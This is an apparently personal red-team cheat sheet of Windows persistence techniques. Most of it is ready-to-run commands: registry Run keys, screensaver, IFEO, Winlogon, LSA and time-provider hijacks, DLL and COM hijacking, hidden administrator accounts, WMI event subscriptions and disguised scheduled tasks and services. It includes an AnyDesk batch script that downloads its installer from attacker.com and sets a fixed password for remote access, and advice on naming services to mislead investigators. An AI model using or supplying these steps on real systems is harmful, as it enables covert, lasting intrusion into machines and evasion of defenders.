## Windows Peristence


## Low Privilege Level
>___


#### Registry Starup Persistence

- Unprivileged

```
> reg add "HKCU\Software\Microsoft\CurrentVersion\Run" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKCU\Software\Microsoft\CurrentVersion\RunOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKCU\Software\Microsoft\CurrentVersion\RunServices" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKCU\Software\Microsoft\CurrentVersion\RunServicesOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"
```

- Privileged users

```
> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v <value> /t REG_SZ /d "C:\path\to\implant"

> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v <value> /t REG_SZ /d "C:\path\to\implant.dll"
```


#### Logon Script (Registry)

Regular User / Medium Integrity Level

- https://attack.mitre.org/techniques/T1037/001/
- https://www.atomicredteam.io/atomic-red-team/atomics/T1037.001
- https://cocomelonc.github.io/persistence/2022/12/09/malware-pers-20.html
- https://hadess.io/the-art-of-windows-persistence/#h-logon-scripts


- add registry key with path to implant
```
> reg add "HKCU\Environment" /v UserInitMprLogonScript /d "c:\path\to\batchscript" /t REG_SZ /f
```

- script.bat
```
@ECHO OFF

C:\path\to\implant
```


#### Shotcut Modification

- https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/


#### Screensavers (Registry)

Regular User / Medium Integrity Level

- https://attack.mitre.org/techniques/T1546/002/
- https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking
- https://www.ired.team/offensive-security/persistence/t1180-screensaver-hijack
- https://pentestlab.blog/2019/10/09/persistence-screensaver/


- set implant to execute
```
> reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "c:\path\to\implant" /f
```

- set timeout
```
> reg add "HKCU\Control Panel\Desktop" /v "ScreeSaveTimeOut" /t REG_SZ /d "60" /f
```

- maybe you need set ScreemSaveActive to 1 and ScreenSaverInSecure to 0


#### Powershell Profile

Regular User / Medium Integrity Level

- https://attack.mitre.org/techniques/T1546/013/
- https://www.ired.team/offensive-security/persistence/powershell-profile-persistence
- https://themayor.notion.site/Windows-PowerShell-Persistence-cd04df3ceec8465b9bd1e3bd2030cd63
- https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
- https://themayor.notion.site/Windows-PowerShell-Persistence-cd04df3ceec8465b9bd1e3bd2030cd63



#### Dll Hijacking / Proxying

- https://attack.mitre.org/techniques/T1574/001/
- https://unit42.paloaltonetworks.com/dll-hijacking-techniques/

1. Find good candidate for hijacking:
   - something running automaticly or triggery by something
   - the app has to be dll hijackable

2. Check directory perms
   - ```ìcacls C:\dir\```

3. Use Procmon to find hijackable paths
   - filter main binary is executed
   - filter Result = NOT FOUND

4. When found hijackable dll check your api imports (optional)
   - you can skip this part and make a proxy dll directly to main dll not found
   - ```dumpbin /imports C:\path\to\binary```
   - looking for hijackable dll imports

5. After found dll and your imports use SharpDllProxy to make a proxy dll to act between bianry and hijackable dll
   - make proxy dll
   - check if imports is correct: ```dumpbin /imports proxy.dll```

6. The last thing is copy proxy dll to path where has NOT FOUND legit dll

- missing DLLs
- https://lsecqt.github.io/Red-Teaming-Army/malware-development/weaponizing-dll-hijacking-via-dll-proxying/
- https://medium.com/@lsecqt/weaponizing-dll-hijacking-via-dll-proxying-3983a8249de0
- https://pentestlab.blog/tag/dll-hijacking/

- DLLs that resides on directories with write permission by low-privilege users
- https://www.blackhillsinfosec.com/a-different-take-on-dll-hijacking/ 

- https://www.youtube.com/watch?v=3eROsG_WNpE (explorer.exe dll hijacking)

- replacing legit dll and exporting same functions
- https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence
- https://web.archive.org/web/20240619201250/https://cn-sec.com/archives/2633298.html

- tools
- https://github.com/Flangvik/SharpDllProxy
- https://github.com/sadreck/Spartacus  Spartacus DLL/COM Hijacking Toolkit 


#### COM Hijacking / Proxying

- https://attack.mitre.org/techniques/T1546/015/
- https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/
- https://tiparaleigo.wordpress.com/2022/04/08/5694/
- https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html
- https://reliaquest.com/blog/threat-spotlight-hijacked-and-hidden-new-backdoor-and-persistence-technique/
- https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661

COM hijacking takes advantage of how Windows looks up and loads COM objects. Each COM class has a unique CLSID and a registry key like InProcServer32 (for DLLs) or LocalServer32 (for EXEs) that tells Windows what to load. These entries can exist in either the HKEY_LOCAL_MACHINE (HKLM) (system-wide) or HKEY_CURRENT_USER (HKCU) (user-specific) registry hives. Because of the registry search order in Windows, the HKCU hive is checked before HKLM, so if a CLSID exists in both, the one in HKCU is prioritized. Since users can write to their own HKCU hive, an attacker can create or override a CLSID entry there. If a program tries to use that COM object, Windows will load the attacker’s DLL instead of the legitimate one. So, the goal is to find a COM object that: 

    - Exists in HKLM
    - A user-mode process uses
    - Preferably has no corresponding entry in HKCU

1. How to find COM objects witch can be hijackable
   - something triggered at boot time or user logon
   - good candidate is task-scheduer
   - ```schtasks /query /xml > C:\path\to\output.xml``` list all tasks

- COM Registries
- HKEY_CLASSES_ROOT --> CLSID --> ...
- HKEY_CURRENT_USER --> Software --> Classes --> CLSID --> ...

2. Looking for: 
   - In Exec section looking for ```<ComHandler>``` with a ```<ClassId>``` (GUID)
   - And in Triggers section looking for ```<LogonTrigger>``` with a ```<Delay>```

3. Check COM obj in registry
   - ```reg query "HKCR\CLSID\{GUID}\..."```

4. After 3 you need found where lives these key if is in Local Machine ou Current User
   - Current User ```reg query "HKCU\software\classes\CLSID\{GUID}\..."```
   - Local Machine ```reg query "HKLM\software\classes\CLSID\{GUID}\..."```

5. Knowing where lives some key you can extract then
   - ```reg export "HKCR\software\classes\CLSID\{GUID}" C:\path\to\output.reg /reg:64 /y```

6. Finally with a maldll you can edit the saved registry adding new path of dll and then import back that
   - change HKEY path (if LM you put CU and vice-versa)
   - later change dll path
   - And then import ```reg import C:\path\output.reg /reg:64```



## High Privilege Level
>___


#### Local Account Create

- https://attack.mitre.org/techniques/T1136/001/

- create new account and add to administrator group

```
net user <USERNAME> <PASS> /add

net localgroup "Administrators" backup /add
```

- add user and hide from logon screen
```
net user <USERNAME> <PASS> /add

net localgroup "Administrators" backup /add

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v <USERNAME> /t REG_DWORD /d 0 /f
```

- batch script for automate

```batch
@echo
echo --------
color off
set user=NAME
set pass=PASS
set AdmGroupSID=S-1-5-32-544
set AdmGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID= '%AdmGroupSID%'" Get Name /Value ^| Find "="`) Do Set AdmGroup=%%J
set AdmGroup=%AdmGroup:~0,-1%
net user %user% %pass% /add /Passwordchg:Yes
net localgroup %AdmGroup% %user% /add
WMCI useraccount where name='%user%' set passwordsexpires=false
```


#### AnyDesk

- https://support.anydesk.com/knowledge/command-line-interface-for-windows
- https://support.anydesk.com/knowledge/use-cases-for-the-command-line-interface

- get anydesk installer, install it, set password and get session id

- On attacker machine launch AnyDesk and connect with target machine id

```batch
@echo off

cmd.exe /c curl attacker.com/AnyDesk.exe -o AnyDesk.exe

mkdir "C:\ProgramData\AnyDesk"

cmd.exe /c C:\Users\Administrator\Documents\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent

cmd.exe /c echo Admin#123 | C:\ProgramData\AnyDesk\anydesk.exe --set-password

cmd.exe /c "for /f ""delims="" %i in ('C:\ProgramData\AnyDesk\AnyDesk.exe --get-id') do echo %i"
```


#### Task-Scheduler

- https://attack.mitre.org/techniques/T1053/005/

- Are 2 types of tasks that you can set:
  - 1 - regular user with low privilegies (limited functionality)
  - 2 - local admin (you have many config options)

- Examples:

- https://thedfirreport.com/wp-content/uploads/2023/12/19208-019.png

- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks

- view info of a task
```
> schtasks /query /tn "TASKNAME" /fo list /v
```

- task run every day at 09 am 
```
> schtasks /create /tn "TASKNAME" /sc daily /st 09:00 /tr "C:\path\to\implant"
```

- task run at every user logon
```
> schtasks /create /sc onlogon /tn AdobeFlashSync /tr "C:\path\to\implant"
```

- task run as SYSTEM level every startup system
```
schtasks /create /ru SYSTEM /sc ONSTART /tn Update2 /tr "COMMAND"
```

- task run every 720 minutes (12hrs)
```
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat /sc MINUTE /mo 720 /F
```

- task run whenever the system is idle for 1 minute
```
schtasks /create /I 1 /TR C:\Users\REDACTED\AppData\Local\Notepad\UpdateEG.bat /TN UpdateEdge /SC ONIDLE
```

- get more examples in mitre and threat reports

- Elevate tasks token to admin:

1. Copy tasks definition: ```schtasks /query /tn AdobeFlashSync /xml > tsk.xml```

2. Open it and add on ```<Principals>``` section: ```<RunLevel>HighestAvailable</RunLevel>```

3. Delete old task: ```schtasks /query /tn AdobeFlashSync```

4. And then create a new tasks with edited xml: ```schtasks /create /tn AdobeFlashSync /xml tsk.xml```



#### Create / Modified Windows Services

- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create
- https://attack.mitre.org/techniques/T1569/002/
- https://attack.mitre.org/techniques/T1543/003/
- https://www.ired.team/offensive-security/persistence/t1035-service-execution#execution
- https://redcanary.com/threat-detection-report/techniques/windows-service/
- https://pentestlab.blog/2019/10/07/persistence-new-service/
- https://cocomelonc.github.io/tutorial/2022/05/09/malware-pers-4.html
- https://www.sans.org/blog/red-team-tactics-hiding-windows-services/

- service code example https://github.com/geleiaa/low_level_things/blob/main/maldev_win/CppSamples/svcimplant.cpp

- Local Admin Privs and elevated session is needed


```
sc start <SVCNAME>

sc delete <SVCNAME>

sc query <SVCNAME>
```

- create service (with service implant)

```
> sc create <SVCNAME> binpath= "C:\path\to\implant" start= auto
```

- Tips for make a service seem legitimate:
- https://grzegorztworek.medium.com/persistence-with-windows-services-1b21579f0ff3

- **Service Name**: Will not name it with randomly generated name and will not suggest it is something worth digging deeper. Good name can refer to some deeply-hidden OS mechanisms, suggesting the investigator “do not touch me and just pass-by”. Something like PnP Enumerator, Transport Layer Security Helper, etc. The more misguiding Google results for such name, the better.

- **Service Description**: Nothing very elaborate, just a phrase or two, somewhat aligned to what the service name says. In most cases no one will read it with an intention of understanding.

- **Service binaries**: Exe is good but DLL is better and services can be run from DLLs too. One of advantages is monitoring tools focus on processes and not on libraries loaded. And from the process perspective, Blue has the well-know, Microsoft-made, whitelisted, and commonly used svchost.exe, which exists in dozens of instances on every single Windows machine.
- https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain

- **Service account and privileges**: Effectively most of services runs with the highest privileges you can observe in the OS. If Red wants to stay undetected, he can leave his service running such way. If Red wants to be tricky, he can also intentionally configure his service on less privileged identity such as LocalService, leaving privilege-based backdoor, to regain full power when needed. 

- **Service activity**: The goal of having his service running is to keep a possibility of running his actions with high privileges. Usually, it is not needed all the time and rather on demand. In the meantime, the service should stay as quiet as possible. Unless necessary, Red should not open ports, should not connect over the network, should not try to open files or registry keys. Anyway, the properly designed service-based persistence will be significantly harder to spot if it works fully asynchronous, acting only when intentionally asked and doing absolutely nothing otherwise.



#### IFEO (Image File Execution Options)

- https://attack.mitre.org/techniques/T1546/012/
- https://securityblueteam.medium.com/utilizing-image-file-execution-options-ifeo-for-stealthy-persistence-331bc972554e
- https://www.atomicredteam.io/atomic-red-team/atomics/T1546.012
- https://amr-git-dot.github.io/offensive/persistence/#image-file-execution
- https://www.darkrelay.com/post/ifeo-injection


- Debugger value
```
> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TARGET-BIN.EXE" /v Debugger /d "C:\path\to\implant" /reg:32 or 64
```

#### WMI Events

- https://attack.mitre.org/techniques/T1546/003/
- https://www.ired.team/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation
- https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
- https://web.archive.org/web/20201207115625/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
- https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
- https://in.security/2019/04/03/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/
- https://medium.com/@ali.bahri/mofs-manipulating-wmi-events-9fc9f58af947

- Administrator level privileges are required to use this technique

- query event filters (cmd and powershell)
```
> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET /format:list

> Get-WmiObject -Class __EventFilter -Namespace root\subscription
```
```
> wmic /NAMESPACE:"\\root\subscription" PATH __EventCosumer GET /format:list

> Get-WmiObject -Class __EventConsumer -Namespace root\subscription
```
```
> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET /format:list

> Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
```

- Typically persistence via WMI event subscription requires creation of the following three classes which are used to store the payload or the arbitrary command, to specify the event that will trigger the payload and to relate the two classes (**__EventConsumer** **&__EventFilter**) so execution and trigger to bind together.


1. create new event sudscription (conditions that the system will listen for). In this case target binary is the trigger to start event.
```
> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="FILTER-NAME", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="Select * From __InstanceCreationEvent Within 15 Where (TargetInstace Isa 'Win32_Process' And TargetInstance.Name = 'TARGET-BIN.EXE')"
```

2. define consumer (consumers can carry out actions when event filters are triggered). here is to run implant.
```
> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="CONSUMER-NAME", WorkingDirectory="C:\path\to\implant\dir", CommandLineTemplate="C:\path\to\implant.exe"
```

3. create binding between filter and consumer to get invoked.
```
> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"FILTER-NAME\"", Consumer="CommandLineEventConsumer.Name=\"CONSUMER-NAME\""
```

- WMI with Powershell

```powershell
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \"#{class_name}\"; Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"; QueryLanguage = 'WQL'}

$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \"#{class_name}\"; CommandLineTemplate = \"#{command}\"}

$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
```


- Event filters examples:

- every 15 seconds check for a process with name "calc.exe" starts to trigger event
```
Query: SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName= 'calc.exe'

Query: select * From __InstaceCreationEvent Within 15 Where (TargetInstace Isa 'Win32_Process' And TargetInstance.Name = 'calc.exe')
```

- execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time
```
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.DayOfWeek = 1 OR TargetInstance.DayOfWeek = 2 OR TargetInstance.DayOfWeek = 3 OR TargetInstance.DayOfWeek = 4 OR TargetInstance.DayOfWeek = 5 OR TargetInstance.DayOfWeek = 6) AND TargetInstance.Hour = 11 AND TargetInstance.Minute = 33 AND TargetInstance.Second = 0 GROUP WITHIN 60
```

- every 60 seconds check if system is up at 5 minutes
```
Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormatteData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
```

- every 60 seconds looking for event id 257 and check if this event includes string "BOB"
```
Query: SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%BOB%'
```

- every 10 seconds check for any service modification
```
Query: SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Service'"
```


- delete filters, consumers and bindings
```
wmic.exe /NAMESPACE:"\\root\subscription\" PATH __EventFilter WHERE Name="TESTE" DELETE

wmic.exe /NAMESPACE:"\\root\subscription\" PATH CommandLineEventConsumer WHERE Name="TESTE" DELETE

wmic.exe /NAMESPACE:"\\root\subscription\" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="TESTE"' DELETE
```



#### Winlogon

- https://attack.mitre.org/techniques/T1547/004/
- https://www.ired.team/offensive-security/persistence/windows-logon-helper
- https://www.hackingarticles.in/windows-persistence-using-winlogon/

- common registry values
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify 
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
```

- check registry value
```
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
```

- add path implant to key value
```
> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\path\to\implant /t reg_sz /f
```


#### Time Providers

- https://attack.mitre.org/techniques/T1547/003/
- https://pentestlab.blog/2019/10/22/persistence-time-providers/
- https://hacklido.com/blog/841-gaining-persistence-on-windows-with-time-providers


- service that control time provs = W32Time

- registry that resides time prov
```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\
```

1. Add new value in the TimeProviders registry
```
> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\<PERSIST-NAME>" /t REG_EXPAND_SZ /v "DllName" /d "%systemroot%\system32\<maltimeprovdll>" /f
```

2. Enable the new Time Provider and set it as a input Time Provider
```
> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\<PERSIST-NAME>" /t REG_DWORD /v "Enabled" /d "1" /f

> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\<PERSIST-NAME>" /t REG_DWORD /v "InputProvider" /d "1" /f
```


#### LSA as persistence - Authentication Package and SSP

- https://attack.mitre.org/techniques/T1547/002/
- https://attack.mitre.org/techniques/T1547/005/
- https://hadess.io/the-art-of-windows-persistence/#h-lsa
- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.002/src/package/package.c (custom mal dll example)
- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.005/T1547.005.md
- https://pentestlab.blog/2019/10/21/persistence-security-support-provider/ (mimilib.dll example)

- Dll as auth package
```
"HKLM\system\currentcontrolset\control\lsa\Authentication Packages"
```

- Dll as SSP
```
"HKLM\system\currentcontrolset\control\lsa\Scurity Packages"
```

- Auth Package Dll 
1. Copy mal dll to C:\Windows\System32\

2. Add value to registry key
```
> reg add "HKLM\system\currentcontrolset\control\lsa" /v "Authetication Packages" /t REG_MULTI_SZ /d "msv1_0"\0"maldll.dll" /f
```

3. After reboot persistence is start


- Dll Security Package
1. Copy mal dll to C:\Windows\System32\

2. Add value to registry key
```
> reg add "HKLM\system\currentcontrolset\control\lsa" /v "Security Packages" /t REG_MULTI_SZ /d "maldll.dll" /f
```

3. After reboot persistence is start



#### Tools for automate

- SharPersist https://github.com/mandiant/SharPersist (prefer execute im-memory)
  - ```> execute-assembly C:\path\to\binary -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <B64-payload>" -n "Updater" -m add -o hourly```
  - ```> execute-assembly C:\path\to\binary -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <B64-payload>" -f "UserEnvSetup" -m add```


#### Conforme eu for achando e testando tecnicas e tools novas vou atualizar aqui.